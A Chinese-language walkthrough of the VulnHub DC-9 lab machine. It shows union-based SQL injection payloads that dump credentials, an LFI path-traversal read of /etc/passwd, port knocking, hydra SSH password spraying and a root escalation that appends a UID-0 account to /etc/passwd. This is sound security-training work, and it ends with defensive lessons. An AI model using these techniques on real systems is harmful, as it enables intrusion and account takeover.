# DC-9 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：VulnHub
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-07-06

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 Nmap 掃描目標 IP 上的開放服務與連接埠：
```bash
┌──(kali㉿kali)-[/usr/…/wordlists/seclists/Discovery/Web-Content]
└─$ nmap -Pn -sV 192.168.180.209    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 12:58 -0400
Nmap scan report for 192.168.180.209
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | filtered     | SSH 服務被防火牆過濾，可能需要 Port Knocking 觸發。 |
| 80/tcp     | HTTP         | Apache 2.4.38 | 網頁伺服器，本靶機的主要攻擊面。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
訪問網頁首頁 `http://192.168.180.209/`，網站主要功能為「Staff Details」員工查詢系統。

![](image/Pasted%20image%2020260706225652.png)

#### 1. SQL 注入點測試 (SQLi)
在搜尋框中輸入萬用 SQL 注入語句 `' or 1=1-- -` 進行測試，提交後頁面成功返回並顯示了資料庫中所有員工的詳細記錄，確認 `search` 參數存在 SQL 注入漏洞：

![](image/Pasted%20image%2020260706230216.png)
![](image/Pasted%20image%2020260706230240.png)

#### 2. 目錄爆破
使用 `gobuster` 爆破網站目錄：
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.180.209 -w /usr/share/wordlists/dirb/common.txt -x php -t 50 -b 403,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.180.209
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
config.php           (Status: 200) [Size: 0]
css                  (Status: 301) [Size: 316] [--> http://192.168.180.209/css/]
display.php          (Status: 200) [Size: 2961]
includes             (Status: 301) [Size: 321] [--> http://192.168.180.209/includes/]
index.php            (Status: 200) [Size: 917]
index.php            (Status: 200) [Size: 917]
logout.php           (Status: 302) [Size: 0] [--> manage.php]
manage.php           (Status: 200) [Size: 1210]
results.php          (Status: 200) [Size: 1056]
search.php           (Status: 200) [Size: 1091]
session.php          (Status: 302) [Size: 0] [--> manage.php]
welcome.php          (Status: 302) [Size: 0] [--> manage.php]
Progress: 9226 / 9226 (100.00%)
===============================================================
Finished
===============================================================
```
發現 `/manage.php` 頁面（若未登入，訪問此頁面會顯示登入表單，直接測試 `file` 參數無法成功讀取任意檔案，需取得後台權限後方可利用 LFI 漏洞）。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)

#### 1. Union-based SQLi 欄位數與注入點判定
在搜尋請求中遞增測試欄位，判定原 SQL 查詢返回的欄位數為 **6**：
```text
' UNION SELECT 1,2,3,4,5,6 -- -
```
根據網頁輸出，所有 6 個位置（ID: 1, Name: 2 3, Position: 4, Phone No: 5, Email: 6）皆會渲染在畫面上，均可用於顯示注入的查詢結果。

![](image/Pasted%20image%2020260707001503.png)

#### 2. 資料庫列舉與後台憑證獲取
*   **獲取當前資料庫名**（取得結果為 `Staff`）：
    
    ```text
    ' UNION SELECT 1,2,3,4,5,database() -- -
    ```
    
    ![](image/Pasted%20image%2020260707001743.png)
    
*   **獲取所有的資料庫名**（發現包含 `Staff` 與 `users`）：
    
    ```text
    ' UNION SELECT 1,2,3,4,5,group_concat(schema_name) FROM information_schema.schemata-- -
    ```
    
    ![](image/Pasted%20image%2020260707002001.png)
    
*   **列出 Staff 資料庫中的資料表**（發現 `Users` 表）：
    
    ```text
    ' UNION SELECT 1,2,3,4,5,group_concat(table_name) FROM information_schema.tables WHERE table_schema='Staff' -- -
    ```
    
    ![](image/Pasted%20image%2020260707002255.png)
    
*   **列出 Users 表中的欄位**（發現 `UserID`, `Username`, `Password`）：
    
    ```text
    ' UNION SELECT 1,2,3,4,5,group_concat(column_name) FROM information_schema.columns WHERE table_name='Users' -- -	
    ```
    
    ![](image/Pasted%20image%2020260707002427.png)
    
*   **導出 Users 表的憑證**：
    
    ```text
    ' UNION SELECT 1,2,3,UserID,Username,Password FROM Staff.Users -- -
    ```
    
    ![](image/Pasted%20image%2020260707002530.png)
    
    取得網頁後台管理員的憑證 Hash：
    `admin:856f5de590ef37314e7c3bdf6f8a66dc`
*   **破解 Hash**：
    將 MD5 Hash 透過 CrackStation 等平台破解，得到明文密碼：`transorbital1`。
    
	![](image/Pasted%20image%2020260707002820.png)

---

### 🌐 後台登入與本地檔案包含 (LFI)

#### 1. 登入網頁後台
使用 `admin:transorbital1` 登入 `http://192.168.180.209/manage.php`。登入成功後，頁面將跳轉並啟用後台控制面板。

![](image/Pasted%20image%2020260707003052.png)

#### 💡 漏洞發現細節：如何發現 ?file 參數？
1. **異常錯誤訊息提示**：
   登入成功進入控制面板後，如果沒有帶任何 GET 參數，網頁的底部（Footer）會預設顯示一行錯誤提示：`File does not exist`。這暗示後端代碼正試圖包含或讀取一個檔案，但由於沒有指定參數，導致路徑為空而報錯。
2. **參數爆破 (Parameter Fuzzing)**：
   為了找出接收檔案名稱的參數名稱，必須攜帶登入後的 Session Cookie 進行參數爆破。使用更現代且快速的 `ffuf` 對常見參數名稱進行模糊測試：

	![](image/Pasted%20image%2020260707004613.png)
	
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u 'http://192.168.180.209/welcome.php?FUZZ=../../../../../../etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -b 'PHPSESSID=38j1256n4p7ktjv3dutm3p8v8g'

........

11                      [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 76ms]
15                      [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 76ms]
14                      [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 77ms]
12                      [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 77ms]
13                      [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 77ms]
1                       [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 77ms]
AudioPlayerSubmit       [Status: 200, Size: 963, Words: 41, Lines: 43, Duration: 70ms]

.........
```

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u 'http://192.168.180.209/welcome.php?FUZZ=../../../../../../etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -b 'PHPSESSID=38j1256n4p7ktjv3dutm3p8v8g' -fs 963

..........

file                    [Status: 200, Size: 3316, Words: 71, Lines: 86, Duration: 72ms]
```
   *   `-u`：指定目標 URL，使用 `FUZZ` 作為參數字典的填充位置。
   *   `-w`：載入常見參數名稱的字典。
   *   `-b`：傳入登入後的 Session Cookie（因為該 LFI 漏洞頁面有登入限制，否則會被重導向至登入頁面導致爆破失敗）。
   *   `-fs 963`：過濾並隱藏回應大小 (Size) 為 963 位元組（即預設顯示 `File does not exist` 錯誤的回應）的結果，只顯示其他成功包含 `/etc/passwd`（回應大小會不同）的有效結果。
   *   爆破完成後，確認參數名稱為 `file`。

#### 2. LFI 漏洞利用
在已登入的 Session 下，訪問 `/manage.php` 並帶入 `file` 參數，即可成功觸發本地檔案包含漏洞，讀取系統敏感檔案：
*   **讀取 `/etc/passwd`**：
	```bash
	┌──(kali㉿kali)-[~]
	└─$ curl 'http://192.168.180.209/welcome.php?file=../../../../../../etc/passwd' -b 'PHPSESSID=38j1256n4p7ktjv3dutm3p8v8g'
	
	..........
	
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
	systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
	systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
	systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
	messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
	sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
	marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash
	julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash
	fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash
	barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash
	tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash
	jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash
	wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash
	bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash
	chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash
	joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash
	rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash
	rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash
	monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash
	phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash
	scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
	janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
	janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
	```
*   **讀取 `/etc/knockd.conf`**：
    透過讀取連接埠敲擊設定檔，以獲取開啟 SSH 的敲擊序列：
    ```http
    http://192.168.180.209/manage.php?file=../../../../../../../../../etc/knockd.conf
    ```

    **取得的配置內容：**
	```text
	[openSSH]
	        sequence    = 7469,8475,9842
	        seq_timeout = 25
	        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
	
	[closeSSH]
	        sequence    = 9842,8475,7469
	        seq_timeout = 25
	        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	        tcpflags    = syn
	
	```
    - 開啟 SSH 的敲擊序列為：**`7469, 8475, 9842`** (TCP)。
    - 關閉 SSH 的敲擊序列為：**`9842, 8475, 7469`** (TCP)。

---

### 🔑 初始存取突破 (Exploitation)

#### 1. 執行連接埠敲擊開啟 SSH
使用 Nmap 掃描發送 TCP SYN 封包，按順序敲擊該三個連接埠以開啟 22 埠：
```bash
┌──(kali㉿kali)-[/usr/…/wordlists/seclists/Discovery/Web-Content]
└─$ for port in 7469 8475 9842 ; do nmap -Pn --max-retries 0 -p$port 192.168.180.209 ; done
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 13:04 -0400
Nmap scan report for 192.168.180.209
Host is up (0.070s latency).

PORT     STATE  SERVICE
7469/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 13:04 -0400
Nmap scan report for 192.168.180.209
Host is up (0.070s latency).

PORT     STATE  SERVICE
8475/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 13:04 -0400
Nmap scan report for 192.168.180.209
Host is up (0.070s latency).

PORT     STATE  SERVICE
9842/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
```
敲擊後重新掃描確認 SSH Port 22 狀態，顯示已變為 `open`：
```bash
┌──(kali㉿kali)-[/usr/…/wordlists/seclists/Discovery/Web-Content]
└─$ nmap -Pn -sV -p 22 192.168.180.209
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 13:04 -0400
Nmap scan report for 192.168.180.209
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

#### 2. SQLi 導出使用者憑證與 SSH 憑證噴灑
*   **跨庫列舉 users.UserDetails 表**：
    我們需要獲取系統使用者的憑證以進行 SSH 登入。利用 SQL 注入列出 `users.UserDetails` 表的帳密：
    ```text
    ' UNION SELECT id,firstname,lastname,username,password,6 FROM users.UserDetails -- -
    ```
    **導出的憑證清單：**
    *   `marym:3kfs86sfd`
    *   `julied:468sfdfsd2`
    *   `fredf:4sfd87sfd1`
    *   `barneyr:RocksOff`
    *   `tomc:TC&TheBoyz`
    *   `jerrym:B8m#48sd`
    *   `wilmaf:Pebbles`
    *   `bettyr:BamBam01`
    *   `chandlerb:UrAG0D!`
    *   `joeyt:Passw0rd`
    *   `rachelg:yN72#dsd`
    *   `rossg:ILoveRachel`
    *   `monicag:3248dsds7s`
    *   `phoebeb:smellycats`
    *   `scoots:YR3BVxxxw87`
    *   `janitor:Ilovepeepee`
    *   `janitor2:Hawaii-Five-0`

*   **SSH 憑證噴灑**：
    將上述帳號與密碼分別存入 `usernames.txt` 與 `passwords.txt`，使用 `hydra` 進行 SSH 憑證噴灑：
	```bash
	┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
	└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.204.209     
	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-09 21:57:36
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
	[DATA] attacking ssh://192.168.204.209:22/
	[22][ssh] host: 192.168.204.209   login: chandlerb   password: UrAG0D!
	[22][ssh] host: 192.168.204.209   login: joeyt   password: Passw0rd
	[STATUS] 276.00 tries/min, 276 tries in 00:01h, 14 to do in 00:01h, 15 active
	[22][ssh] host: 192.168.204.209   login: janitor   password: Ilovepeepee
	1 of 1 target successfully completed, 3 valid passwords found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-09 21:58:43
	```
    **成功噴灑出三個有效帳號：**
    - `janitor:Ilovepeepee`
    - `joeyt:Passw0rd`
    - `chandlerb:UrAG0D!`

    使用 `janitor` 帳密透過 SSH 登入系統：
    ```bash
    ┌──(kali㉿kali)-[~/vulnhub/DC-9]
    └─$ ssh janitor@192.168.180.209
    ```

#### 3. 橫向移動 (janitor -> fredf)
登入 `janitor` 後，在其家目錄下的隱藏資料夾中發現了另一個密碼檔：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
└─$ ssh janitor@192.168.204.209  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
janitor@192.168.204.209's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 12:02:41 2026 from 192.168.45.231
janitor@dc-9:~$ ls -al
total 16
drwx------  4 janitor janitor 4096 Jul 10 11:58 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Jul 10 11:58 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls -al
total 12
drwx------ 2 janitor janitor 4096 Dec 29  2019 .
drwx------ 4 janitor janitor 4096 Jul 10 11:58 ..
-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
將這批新密碼加入 `passwords.txt` 字典檔中，再次使用 `hydra` 對 SSH 進行噴灑：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ hydra -L usernames.txt -P passwords.txt ssh://192.168.180.209
```
**取得另一位使用者的憑證：**
- `fredf:B4-Tru3-001`

使用 SSH 登入為 `fredf` 使用者，並找到 `local.txt`：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
└─$ ssh fredf@192.168.204.209  
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
fredf@192.168.204.209's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
fredf@dc-9:~$ find / -type f -name local.txt 2>/dev/null
/home/fredf/local.txt
```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
登入 `fredf` 帳號後，執行 `sudo -l` 檢視所擁有的特權指令：
```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```
*   `fredf` 可免密碼以 root 權限執行 `/opt/devstuff/dist/test/test`。
	```bash
	fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test
	Usage: python test.py read append
	```
*   審查該路徑下的程式，發現該二進制程式是由 `/opt/devstuff/test.py` Python 腳本編譯而成。
*   此程式接收兩個參數：`[read_file_path] [append_file_path]`。功能為將前者的內容追加寫入至後者。
*   因為是以 root 權限執行此檔案，我們可以利用這個追加寫入的功能，將自定義的特權使用者資訊追加到系統的 `/etc/passwd` 中。

---

### 👑 提權利用 (Exploitation to Root / SYSTEM)

#### 1. 生成偽造的 root 使用者密碼 Hash
在攻擊機或靶機本地生成一個 MD5-crypt 加密密碼 Hash（此處設密碼為 `password`）：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/DC-9]
└─$ openssl passwd -1 password
$1$EeCpViL3$/hKQoVaQ4sDBhMpl406WA.
```

#### 2. 建立偽造的使用者紀錄
建立臨時檔案 `/tmp/add-me`，寫入自訂的特權帳號 `pwned`，將 UID/GID 設為 0，家目錄設為 `/root`，Shell 為 `/bin/bash`：
```bash
fredf@dc-9:/opt/devstuff$ echo 'pwned:$1$EeCpViL3$/hKQoVaQ4sDBhMpl406WA.:0:0:root:/root:/bin/bash' > /tmp/add-me
```

#### 3. 追加寫入至 /etc/passwd
利用 `/opt/devstuff/dist/test/test` 將 `/tmp/add-me` 追加至 `/etc/passwd`：
```bash
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /tmp/add-me /etc/passwd
```

#### 4. 切換帳號取得 Root
使用 `su pwned`，並輸入密碼 `password`，成功取得最高權限：
```bash
fredf@dc-9:/opt/devstuff$ su pwned
Password: 
root@dc-9:/opt/devstuff# find / -type f -name proof.txt 2>/dev/null
/root/proof.txt
```
成功取得 Flag，滲透測試完成。

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **SQL 注入防禦**：開發查詢功能時，必須使用參數化查詢（Prepared Statements），以徹底防範 Union-based SQLi 導致的敏感資料外洩。
2. **客製化自動化腳本的安全漏洞**：在使用 `sudoers` 檔案授權普通使用者以 root 身分執行二進制檔案或腳本時，必須非常小心。任何具備讀取/寫入檔案（特別是像本例中任意檔案追加）或呼叫系統命令功能的程式，都極易演變成提權向量。應嚴禁給予此類程式 sudo 權限。
3. **密碼重用與複雜度原則**：系統多個使用者帳號密碼與資料庫內的員工密碼相同，導致了嚴重的憑證噴灑攻擊（Credential Spraying）。系統應實施強密碼策略並禁止在不同服務間重用密碼。
4. **資訊洩漏**：不應將敏感密碼純文字寫在系統內部的隨手記隱藏檔案中，一旦初始帳號被突破，這些資訊將直接導致橫向移動的連鎖效應。
